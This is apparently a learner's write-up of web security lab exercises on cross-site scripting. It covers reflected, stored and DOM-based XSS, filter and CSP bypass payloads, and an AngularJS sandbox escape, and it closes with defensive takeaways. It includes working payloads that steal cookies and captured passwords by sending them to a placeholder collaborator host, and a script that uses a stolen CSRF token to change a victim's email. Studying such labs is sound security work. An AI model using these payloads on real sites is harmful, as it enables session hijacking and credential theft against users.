# Cross-Site Scripting (XSS)

## What is XSS

XSS occurs when an attacker injects malicious JavaScript into a web page that is then executed in another user's browser. The core problem is that the application includes user-controlled data in its output without properly encoding it, so the browser cannot distinguish between legitimate page content and attacker-supplied script.

## Labs completed

- Reflected XSS into attribute with angle brackets HTML-encoded (Apprentice)
- DOM XSS in document.write sink using source location.search inside select element (Apprentice)
- Reflected DOM XSS (Practitioner)
- Stored DOM XSS (Practitioner)
- Reflected XSS with some SVG markup allowed (Practitioner)
- Reflected XSS in canonical link tag (Practitioner)
- Reflected XSS into JavaScript string with single quote and backslash escaped (Practitioner)
- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped (Practitioner)
- Reflected XSS into template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped (Practitioner)
- Exploiting XSS to steal cookies (Practitioner)
- Exploiting XSS to capture passwords (Practitioner)
- Exploiting XSS to perform CSRF (Practitioner)
- Reflected XSS with AngularJS sandbox escape (Expert)
- Reflected XSS with CSP bypass (Expert)

## Three types of XSS

**Reflected XSS** — the payload is injected in a URL parameter, the server reflects it in the response, and the victim must click a crafted link. The payload is not stored anywhere and exists only for the duration of that single request.

**Stored XSS** — the payload is saved to a database, for example in a comment or profile field, and executes automatically for every user who visits the affected page. No interaction beyond visiting the page is required from the victim, making this the most dangerous variant.

**DOM-based XSS** — the vulnerability exists entirely on the client side. The server never sees the payload. The browser compromises itself through unsafe JavaScript functions that write attacker-controlled data directly into the DOM. The two key concepts here are sources, which are places where user input enters the JavaScript context such as `location.search` or `location.hash`, and sinks, which are dangerous functions that consume that input such as `document.write`, `innerHTML`, and `eval`.

## Techniques and payloads

**Escaping HTML attributes** — when angle brackets are encoded but the input lands inside an HTML attribute, close the attribute with a quote and inject an event handler: `"onmouseover="alert(1)`.

**Breaking out of a select element** — when `document.write` embeds user input inside a `<select>` tag, close the element and inject a new tag: `"></select><img src=1 onerror=alert(1)>`.

**Reflected DOM XSS via eval** — when the server reflects input inside JSON that JavaScript passes to `eval`, escape the string and terminate the expression: `\"-alert(1)}//`. The backslash escapes the server-added quote, the dash closes the expression, and `//` comments out the remainder.

**Stored DOM XSS via innerHTML** — `innerHTML` does not execute `<script>` tags, but it does process event handlers on other elements: `<img src=1 onerror=alert(1)>`.

**SVG event handlers** — when standard tags are blocked but SVG is allowed, use SVG-specific events that fire without user interaction: `<svg><animatetransform onbegin=alert(1) attributeName=transform>`. Filters often treat SVG as inert image markup while the browser executes it as a full document with its own event model.

**Canonical link tag** — input reflected inside a `<link rel="canonical">` in the document head cannot be triggered with mouse events. Inject an `accesskey` attribute and `onclick` instead: `?'accesskey='x'onclick='alert(1)`. The payload fires when the user presses the keyboard shortcut assigned to that element.

**Closing a script block from inside a JavaScript string** — when single quotes are escaped, inject `</script>` to close the script block entirely. The HTML parser processes this before the JavaScript engine sees the string, so the escape on the quote becomes irrelevant: `</script><img src=1 onerror=alert(1)>`.

**HTML entities in event handlers** — when quotes and backslashes are filtered but the input lands in an onclick attribute, use the HTML entity `&apos;` instead of a literal apostrophe. The filter sees an entity, but the browser decodes it to a quote before executing the JavaScript: `http://anything?&apos;-alert(1)-&apos;`.

**Template literal injection** — when input lands inside a JavaScript template literal, the `${}` syntax executes arbitrary expressions without requiring any quotes: `${alert(1)}`.

**SVG animate for dynamic attribute setting** — when `href=javascript:` is blocked statically, set it at runtime through animation: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`. The filter never sees a static `javascript:` value.

**AngularJS sandbox escape** — AngularJS evaluated expressions in `{{ }}` inside a sandbox that was supposed to prevent code execution. The sandbox relied on `charAt` to analyze code, so overwriting it on the String prototype broke the analysis and allowed arbitrary expressions through: `toString().constructor.prototype.charAt=[].join`. AngularJS officially abandoned the sandbox, acknowledging it could not be made secure.

**CSP bypass via header injection** — if a URL parameter is reflected inside the `Content-Security-Policy` header, for example in a `report-uri` directive, a semicolon can introduce a new directive that overrides the original: `?token=;script-src-elem 'unsafe-inline'`.

## Real attack payloads

**Cookie theft for session hijacking:**

```javascript
fetch('https://COLLABORATOR-URL', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
```

Copy the session cookie from the Collaborator interaction and paste it into DevTools under Application → Cookies to take over the session. The `HttpOnly` flag on cookies prevents JavaScript from accessing `document.cookie` and stops this attack.

**Password capture via autofill:**

```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR-URL',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
});">
```

**XSS combined with CSRF to change a victim's email:**

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=attacker@evil.com');
}
```

The payload first fetches the victim's account page, extracts the CSRF token from the HTML, then submits the email change request with a valid token. XSS completely nullifies CSRF protection — both vulnerabilities must be fixed together.

## Key takeaway

Blacklists fail because there are always alternative vectors — SVG events, HTML entities, template literals, animation attributes. The only reliable defense is context-aware output encoding combined with a strict Content Security Policy. CSRF tokens provide no protection when XSS is present because the attacker can read and replay them from the victim's browser.
